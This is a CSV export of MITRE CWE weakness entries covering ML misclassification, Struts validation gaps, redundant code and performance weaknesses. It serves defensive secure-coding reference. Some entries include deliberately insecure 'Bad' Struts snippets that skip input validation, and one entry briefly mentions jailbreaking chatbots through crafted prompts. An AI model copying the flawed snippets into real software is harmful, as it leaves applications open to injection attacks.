deviations such as sudden drops in accuracy or unexpected outputs to verify the model."", ""effectiveness"": null}, {""method"": null, ""description"": ""Use indicators from input data collection mechanisms to verify that inputs are statistically within the distribution of the training and test data."", ""effectiveness"": null}, {""method"": null, ""description"": ""Use multiple models or model ensembling techniques to check for consistency of predictions/inferences."", ""effectiveness"": null}], ""extended_description"": ""When techniques such as machine learning are used to automatically classify input streams, and those classifications are used for security-critical decisions, then any mistake in classification can introduce a vulnerability that allows attackers to cause the product to make the wrong security decision or disrupt service of the automated mechanism.  If the mechanism is not developed or \""trained\"" with enough input data or has not adequately undergone test and evaluation, then attackers may be able to craft malicious inputs that intentionally trigger the incorrect classification.\n            Targeted technologies include, but are not necessarily limited to:\n            automated speech recognition\n               automated image recognition\n               automated cyber defense\n               Chatbot, LLMs, generative AI\n            For example, an attacker might modify road signs or road surface markings to trick autonomous vehicles into misreading the sign/marking and performing a dangerous action. Another example includes an attacker that crafts highly specific and complex prompts to \""jailbreak\"" a chatbot to bypass safety or privacy mechanisms, better known as prompt injection attacks.""}"
"CWE-104","Struts: Form Bean Does Not Extend Validation Class","If a form bean does not extend an ActionForm subclass of the Validator framework, it can expose the application to other weaknesses related to insufficient input validation.","","Variant","Draft","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": ""Bypassing the validation framework for a form exposes the application to numerous types of attacks. Unchecked input is an important component of vulnerabilities like cross-site scripting, process control, and SQL injection."", ""scope"": ""Other"", ""impact"": ""Other""}, {""note"": ""Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack."", ""scope"": ""Confidentiality, Integrity, Availability, Other"", ""impact"": ""Other""}]","[{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Ensure that all forms extend one of the Validation Classes."", ""effectiveness"": null}]","[{""method"": null, ""description"": ""Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \""sources\"" (origins of input) with \""sinks\"" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)"", ""effectiveness"": null}]","[{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class RegistrationForm extends org.apache.struts.action.ActionForm {\n                     // private variables for registration formprivate String name;private String email;...\n                           public RegistrationForm() {super();}\n                           // getter and setter methods for private variables...}"", ""language"": ""Bad""}, {""code"": ""public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {\n                     // private variables for registration formprivate String name;private String email;...\n                           public RegistrationForm() {super();}\n                           public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...}\n                           // getter and setter methods for private variables...}"", ""language"": ""Good""}]}]","","{""name"": ""Struts: Form Bean Does Not Extend Validation Class"", ""cwe_id"": ""CWE-104"", ""status"": ""Draft"", ""category"": """", ""examples"": [{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class RegistrationForm extends org.apache.struts.action.ActionForm {\n                     // private variables for registration formprivate String name;private String email;...\n                           public RegistrationForm() {super();}\n                           // getter and setter methods for private variables...}"", ""language"": ""Bad""}, {""code"": ""public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {\n                     // private variables for registration formprivate String name;private String email;...\n                           public RegistrationForm() {super();}\n                           public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...}\n                           // getter and setter methods for private variables...}"", ""language"": ""Good""}]}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Variant"", ""description"": ""If a form bean does not extend an ActionForm subclass of the Validator framework, it can expose the application to other weaknesses related to insufficient input validation."", ""mitigations"": [{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Ensure that all forms extend one of the Validation Classes."", ""effectiveness"": null}], ""consequences"": [{""note"": ""Bypassing the validation framework for a form exposes the application to numerous types of attacks. Unchecked input is an important component of vulnerabilities like cross-site scripting, process control, and SQL injection."", ""scope"": ""Other"", ""impact"": ""Other""}, {""note"": ""Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack."", ""scope"": ""Confidentiality, Integrity, Availability, Other"", ""impact"": ""Other""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": ""Ensure that all forms extend one of the Validation Classes."", ""detection_methods"": [{""method"": null, ""description"": ""Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \""sources\"" (origins of input) with \""sinks\"" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)"", ""effectiveness"": null}], ""extended_description"": """"}"
"CWE-1041","Use of Redundant Code","The product has multiple functions, methods, procedures, macros, etc. that
					contain the same code.","This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  For example, if there are two copies of the same code, the programmer might fix a weakness in one copy while forgetting to fix the same weakness in another copy.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Merge common functionality into a single function and then call that function from across the entire code base."", ""effectiveness"": null}]","[]","[{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class Main {\n                     public static void main(String[] args) {\n                        double s = 10.0;\n                        double r = 1.0;\n                        double pi = 3.14159;\n                        double surface_area;\n                        if(r > 0.0) {\n                           // complex math equations\n                           surface_area = pi * r * s + pi * Math.pow(r, 2);\n                        }\n                        if(r > 1.0) {\n                           // a complex set of math\n                           surface_area = pi * r * s + pi * Math.pow(r, 2);\n                        }\n                     }\n                  }"", ""language"": ""Bad""}, {""code"": ""public class Main {\n                     private double ComplexMath(double r, double s) {\n                        //complex math equations\n                        double pi = Math.PI;\n                        double surface_area = pi * r * s + pi * Math.pow(r, 2);\n                        return surface_area;\n                     }\n                     public static void main(String[] args) {\n                        double s = 10.0;\n                        double r = 1.0;\n                        double surface_area;\n                        if(r > 0.0) {\n                           surface_area = ComplexMath(r, s);\n                        }\n                        if(r > 1.0) {\n                           surface_area = ComplexMath(r, s);\n                        }\n                     }\n                  }"", ""language"": ""Good""}]}]","","{""name"": ""Use of Redundant Code"", ""cwe_id"": ""CWE-1041"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class Main {\n                     public static void main(String[] args) {\n                        double s = 10.0;\n                        double r = 1.0;\n                        double pi = 3.14159;\n                        double surface_area;\n                        if(r > 0.0) {\n                           // complex math equations\n                           surface_area = pi * r * s + pi * Math.pow(r, 2);\n                        }\n                        if(r > 1.0) {\n                           // a complex set of math\n                           surface_area = pi * r * s + pi * Math.pow(r, 2);\n                        }\n                     }\n                  }"", ""language"": ""Bad""}, {""code"": ""public class Main {\n                     private double ComplexMath(double r, double s) {\n                        //complex math equations\n                        double pi = Math.PI;\n                        double surface_area = pi * r * s + pi * Math.pow(r, 2);\n                        return surface_area;\n                     }\n                     public static void main(String[] args) {\n                        double s = 10.0;\n                        double r = 1.0;\n                        double surface_area;\n                        if(r > 0.0) {\n                           surface_area = ComplexMath(r, s);\n                        }\n                        if(r > 1.0) {\n                           surface_area = ComplexMath(r, s);\n                        }\n                     }\n                  }"", ""language"": ""Good""}]}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product has multiple functions, methods, procedures, macros, etc. that\n\t\t\t\t\tcontain the same code."", ""mitigations"": [{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Merge common functionality into a single function and then call that function from across the entire code base."", ""effectiveness"": null}], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": ""Merge common functionality into a single function and then call that function from across the entire code base."", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  For example, if there are two copies of the same code, the programmer might fix a weakness in one copy while forgetting to fix the same weakness in another copy.""}"
"CWE-1042","Static Member Data Element outside of a Singleton Class Element","The code contains a member element that is declared as static (but not final), in which
					its parent class element 
					is not a singleton class - that is, a class element that can be used only once in
					the 'to' association of a Create action.","This issue can make the product perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.","Variant","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}]","[]","[]","[]","","{""name"": ""Static Member Data Element outside of a Singleton Class Element"", ""cwe_id"": ""CWE-1042"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Variant"", ""description"": ""The code contains a member element that is declared as static (but not final), in which\n\t\t\t\t\tits parent class element \n\t\t\t\t\tis not a singleton class - that is, a class element that can be used only once in\n\t\t\t\t\tthe 'to' association of a Create action."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can make the product perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.""}"
"CWE-1043","Data Element Aggregating an Excessively Large Number of Non-Primitive Elements","The product uses a data element that has an excessively large
					number of sub-elements with non-primitive data types such as structures or aggregated objects.","This issue can make the product perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.
		 While the interpretation of ""excessively large"" may vary for each product or developer, CISQ recommends a default of 5 sub-elements.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}]","[]","[]","[]","","{""name"": ""Data Element Aggregating an Excessively Large Number of Non-Primitive Elements"", ""cwe_id"": ""CWE-1043"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product uses a data element that has an excessively large\n\t\t\t\t\tnumber of sub-elements with non-primitive data types such as structures or aggregated objects."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can make the product perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n\t\t While the interpretation of \""excessively large\"" may vary for each product or developer, CISQ recommends a default of 5 sub-elements.""}"
"CWE-1044","Architecture with Number of Horizontal Layers Outside of Expected Range","The product's architecture contains too many - or too few -
					horizontal layers.","This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
		 While the interpretation of ""expected range"" may vary for each product or developer, CISQ recommends a default minimum of 4 layers and maximum of 8 layers.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Architecture with Number of Horizontal Layers Outside of Expected Range"", ""cwe_id"": ""CWE-1044"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product's architecture contains too many - or too few -\n\t\t\t\t\thorizontal layers."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.\n\t\t While the interpretation of \""expected range\"" may vary for each product or developer, CISQ recommends a default minimum of 4 layers and maximum of 8 layers.""}"
"CWE-1045","Parent Class with a Virtual Destructor and a Child Class without a Virtual Destructor","A parent class has a virtual destructor method, but the parent has a child class that does not have a virtual destructor.","This issue can prevent the product from running reliably, since the child might not perform essential destruction operations.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability, such as a memory leak (CWE-401).","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}]","[]","[]","[]","","{""name"": ""Parent Class with a Virtual Destructor and a Child Class without a Virtual Destructor"", ""cwe_id"": ""CWE-1045"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""A parent class has a virtual destructor method, but the parent has a child class that does not have a virtual destructor."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can prevent the product from running reliably, since the child might not perform essential destruction operations.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability, such as a memory leak (CWE-401).""}"
"CWE-1046","Creation of Immutable Text Using String Concatenation","The product creates an immutable text string using string concatenation operations.","When building a string via a looping feature (e.g., a FOR or WHILE loop), the use of += to append to the existing string will result in the creation of a new object with each iteration. This programming pattern can be inefficient in comparison with use of text buffer data elements. This issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this could be influenced to create performance problem.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}]","[]","[]","[]","","{""name"": ""Creation of Immutable Text Using String Concatenation"", ""cwe_id"": ""CWE-1046"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product creates an immutable text string using string concatenation operations."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""When building a string via a looping feature (e.g., a FOR or WHILE loop), the use of += to append to the existing string will result in the creation of a new object with each iteration. This programming pattern can be inefficient in comparison with use of text buffer data elements. This issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this could be influenced to create performance problem.""}"
"CWE-1047","Modules with Circular Dependencies","The product contains modules in which one module has references that cycle back to itself, i.e., there are circular dependencies.","As an example, with Java, this weakness might indicate cycles between packages.
This issue makes it more difficult to maintain the product due to insufficient modularity, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
This issue can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}]","[]","[]","[]","","{""name"": ""Modules with Circular Dependencies"", ""cwe_id"": ""CWE-1047"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product contains modules in which one module has references that cycle back to itself, i.e., there are circular dependencies."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""As an example, with Java, this weakness might indicate cycles between packages.\nThis issue makes it more difficult to maintain the product due to insufficient modularity, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.\nThis issue can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.""}"
"CWE-1048","Invokable Control Element with Large Number of Outward Calls","The code contains callable control elements that
         contain an excessively large number of references to other
         application objects external to the context of the callable,
         i.e. a Fan-Out value that is excessively large.","While the interpretation of ""excessively large Fan-Out value"" may vary for each product or developer, CISQ recommends a default of 5 referenced objects.
		 This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Invokable Control Element with Large Number of Outward Calls"", ""cwe_id"": ""CWE-1048"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The code contains callable control elements that\n         contain an excessively large number of references to other\n         application objects external to the context of the callable,\n         i.e. a Fan-Out value that is excessively large."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""While the interpretation of \""excessively large Fan-Out value\"" may vary for each product or developer, CISQ recommends a default of 5 referenced objects.\n\t\t This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1049","Excessive Data Query Operations in a Large Data Table","The product performs a data query with a large number of joins
					and sub-queries on a large data table.","This issue can make the product perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.
	 While the interpretation of ""large data table"" and ""large number of joins or sub-queries"" may vary for each product or developer, CISQ recommends a default of 1 million rows for a ""large"" data table, a default minimum of 5 joins, and a default minimum of 3 sub-queries.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}]","[]","[]","[]","","{""name"": ""Excessive Data Query Operations in a Large Data Table"", ""cwe_id"": ""CWE-1049"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product performs a data query with a large number of joins\n\t\t\t\t\tand sub-queries on a large data table."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can make the product perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n\t While the interpretation of \""large data table\"" and \""large number of joins or sub-queries\"" may vary for each product or developer, CISQ recommends a default of 1 million rows for a \""large\"" data table, a default minimum of 5 joins, and a default minimum of 3 sub-queries.""}"
"CWE-105","Struts: Form Field Without Validator","The product has a form field that is not validated by a corresponding validation form, which can introduce other weaknesses related to insufficient input validation.","Omitting validation for even a single input field may give attackers the leeway they need to compromise the product. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.","Variant","Draft","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Integrity"", ""impact"": ""Unexpected State""}, {""note"": ""If unused fields are not validated, shared business logic in an action may allow attackers to bypass the validation checks that are performed for other uses of the form."", ""scope"": ""Integrity"", ""impact"": ""Bypass Protection Mechanism""}]","[{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Validate all form fields. If a field is unused, it is still important to constrain it so that it is empty or undefined."", ""effectiveness"": null}]","[]","[{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {// private variables for registration form\n                        private String name;private String address;private String city;private String state;private String zipcode;private String phone;private String email;\n                        public RegistrationForm() {super();}\n                        \n                        // getter and setter methods for private variables\n                        ...}"", ""language"": ""Result""}, {""code"": ""<form-validation><formset><form name=\""RegistrationForm\""><field property=\""name\"" depends=\""required\""><arg position=\""0\"" key=\""prompt.name\""/></field><field property=\""address\"" depends=\""required\""><arg position=\""0\"" key=\""prompt.address\""/></field><field property=\""city\"" depends=\""required\""><arg position=\""0\"" key=\""prompt.city\""/></field><field property=\""state\"" depends=\""required,mask\""><arg position=\""0\"" key=\""prompt.state\""/><var><var-name>mask</var-name><var-value>[a-zA-Z]{2}</var-value></var></field><field property=\""zipcode\"" depends=\""required,mask\""><arg position=\""0\"" key=\""prompt.zipcode\""/><var><var-name>mask</var-name><var-value>\\d{5}</var-value></var></field></form></formset></form-validation>"", ""language"": ""Bad""}, {""code"": ""<form-validation><formset><form name=\""RegistrationForm\""><field property=\""name\"" depends=\""required\""><arg position=\""0\"" key=\""prompt.name\""/></field><field property=\""address\"" depends=\""required\""><arg position=\""0\"" key=\""prompt.address\""/></field><field property=\""city\"" depends=\""required\""><arg position=\""0\"" key=\""prompt.city\""/></field><field property=\""state\"" depends=\""required,mask\""><arg position=\""0\"" key=\""prompt.state\""/><var><var-name>mask</var-name><var-value>[a-zA-Z]{2}</var-value></var></field><field property=\""zipcode\"" depends=\""required,mask\""><arg position=\""0\"" key=\""prompt.zipcode\""/><var><var-name>mask</var-name><var-value>\\d{5}</var-value></var></field><field property=\""phone\"" depends=\""required,mask\""><arg position=\""0\"" key=\""prompt.phone\""/><var><var-name>mask</var-name><var-value>^([0-9]{3})(-)([0-9]{4}|[0-9]{4})$</var-value></var></field><field property=\""email\"" depends=\""required,email\""><arg position=\""0\"" key=\""prompt.email\""/></field></form></formset></form-validation>"", ""language"": ""Good""}]}]","","{""name"": ""Struts: Form Field Without Validator"", ""cwe_id"": ""CWE-105"", ""status"": ""Draft"", ""category"": """", ""examples"": [{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {// private variables for registration form\n                        private String name;private String address;private String city;private String state;private String zipcode;private String phone;private String email;\n                        public RegistrationForm() {super();}\n                        \n                        // getter and setter methods for private variables\n                        ...}"", ""language"": ""Result""}, {""code"": ""<form-validation><formset><form name=\""RegistrationForm\""><field property=\""name\"" depends=\""required\""><arg position=\""0\"" key=\""prompt.name\""/></field><field property=\""address\"" depends=\""required\""><arg position=\""0\"" key=\""prompt.address\""/></field><field property=\""city\"" depends=\""required\""><arg position=\""0\"" key=\""prompt.city\""/></field><field property=\""state\"" depends=\""required,mask\""><arg position=\""0\"" key=\""prompt.state\""/><var><var-name>mask</var-name><var-value>[a-zA-Z]{2}</var-value></var></field><field property=\""zipcode\"" depends=\""required,mask\""><arg position=\""0\"" key=\""prompt.zipcode\""/><var><var-name>mask</var-name><var-value>\\d{5}</var-value></var></field></form></formset></form-validation>"", ""language"": ""Bad""}, {""code"": ""<form-validation><formset><form name=\""RegistrationForm\""><field property=\""name\"" depends=\""required\""><arg position=\""0\"" key=\""prompt.name\""/></field><field property=\""address\"" depends=\""required\""><arg position=\""0\"" key=\""prompt.address\""/></field><field property=\""city\"" depends=\""required\""><arg position=\""0\"" key=\""prompt.city\""/></field><field property=\""state\"" depends=\""required,mask\""><arg position=\""0\"" key=\""prompt.state\""/><var><var-name>mask</var-name><var-value>[a-zA-Z]{2}</var-value></var></field><field property=\""zipcode\"" depends=\""required,mask\""><arg position=\""0\"" key=\""prompt.zipcode\""/><var><var-name>mask</var-name><var-value>\\d{5}</var-value></var></field><field property=\""phone\"" depends=\""required,mask\""><arg position=\""0\"" key=\""prompt.phone\""/><var><var-name>mask</var-name><var-value>^([0-9]{3})(-)([0-9]{4}|[0-9]{4})$</var-value></var></field><field property=\""email\"" depends=\""required,email\""><arg position=\""0\"" key=\""prompt.email\""/></field></form></formset></form-validation>"", ""language"": ""Good""}]}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Variant"", ""description"": ""The product has a form field that is not validated by a corresponding validation form, which can introduce other weaknesses related to insufficient input validation."", ""mitigations"": [{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Validate all form fields. If a field is unused, it is still important to constrain it so that it is empty or undefined."", ""effectiveness"": null}], ""consequences"": [{""note"": """", ""scope"": ""Integrity"", ""impact"": ""Unexpected State""}, {""note"": ""If unused fields are not validated, shared business logic in an action may allow attackers to bypass the validation checks that are performed for other uses of the form."", ""scope"": ""Integrity"", ""impact"": ""Bypass Protection Mechanism""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": ""Validate all form fields. If a field is unused, it is still important to constrain it so that it is empty or undefined."", ""detection_methods"": [], ""extended_description"": ""Omitting validation for even a single input field may give attackers the leeway they need to compromise the product. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.""}"
"CWE-1050","Excessive Platform Resource Consumption within a Loop","The product has a loop body or loop condition that contains a control element that directly or
					indirectly consumes platform resources, e.g. messaging, sessions, locks, or file
					descriptors.","This issue can make the product perform more slowly.  If an attacker can influence the number of iterations in the loop, then this performance problem might allow a denial of service by consuming more platform resources than intended.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}]","[]","[]","[]","","{""name"": ""Excessive Platform Resource Consumption within a Loop"", ""cwe_id"": ""CWE-1050"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product has a loop body or loop condition that contains a control element that directly or\n\t\t\t\t\tindirectly consumes platform resources, e.g. messaging, sessions, locks, or file\n\t\t\t\t\tdescriptors."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can make the product perform more slowly.  If an attacker can influence the number of iterations in the loop, then this performance problem might allow a denial of service by consuming more platform resources than intended.""}"
